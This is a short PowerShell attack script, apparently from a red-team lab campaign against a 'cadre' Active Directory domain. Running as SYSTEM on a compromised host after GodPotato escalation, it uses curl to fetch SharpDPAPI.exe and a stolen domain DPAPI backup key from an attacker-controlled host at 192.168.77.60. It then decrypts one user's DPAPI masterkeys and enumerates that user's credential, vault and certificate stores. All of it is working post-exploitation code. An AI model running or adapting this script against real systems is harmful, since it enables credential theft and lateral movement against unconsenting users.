# Runs on mbr01 as SYSTEM via SQL->GodPotato (campaign-a-t043-system-exec.ps1)
# 3.5G retry with CRTE SharpDPAPI: decrypt analyst_cloud.CADRE DPAPI masterkeys with cadre domain PVK
$tools = 'C:\Windows\Temp\cadre-tools'
try {
  curl.exe -s -o "$tools\SharpDPAPI.exe" http://192.168.77.60:8081/SharpDPAPI.exe
  curl.exe -s -o "$tools\ntds.pvk" http://192.168.77.60:8081/ntds_capi_0_73eeb965-bf4b-4e9a-8e3e-1814df83d602.keyx.rsa.pvk
  Write-Output "DL_OK SharpDPAPI=$((Get-Item "$tools\SharpDPAPI.exe").Length) pvk=$((Get-Item "$tools\ntds.pvk").Length)"
} catch { Write-Output "DL_FAIL $($_.Exception.Message)" }

Write-Output '--- analyst_cloud profile present? ---'
Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'analyst_cloud' } | ForEach-Object { Write-Output "PROFILE $($_.Name)" }

Write-Output '--- masterkeys /pvk (cadre domain PVK) ---'
& "$tools\SharpDPAPI.exe" masterkeys /pvk:"$tools\ntds.pvk" 2>&1 | ForEach-Object { Write-Output "MK|$_" }

Write-Output '--- analyst_cloud DPAPI dirs ---'
foreach ($p in @(
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\Protect',
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\Credentials',
  'C:\Users\analyst_cloud.CADRE\AppData\Local\Microsoft\Credentials',
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\Vault',
  'C:\Users\analyst_cloud.CADRE\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates'
)) {
  if (Test-Path $p) {
    $n = (Get-ChildItem $p -File -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
    Write-Output "DIR $n $p"
  } else { Write-Output "DIR MISSING $p" }
}
Write-Output 'MBR01_35G_DONE'
